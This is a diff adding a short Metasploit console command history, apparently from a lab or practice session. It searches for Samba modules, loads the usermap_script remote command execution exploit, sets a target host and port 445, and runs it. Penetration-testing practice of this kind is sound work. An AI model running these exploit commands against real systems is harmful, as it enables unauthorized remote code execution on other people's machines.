@@ -1,0 +1,12 @@
+search samba
+exit
+search samba
+use exploit/multi/samba/usermap_script
+options
+set RHOSTS 172.63.0.21
+set RPORT 445
+run
+exit
+search samba
+show options
+exit
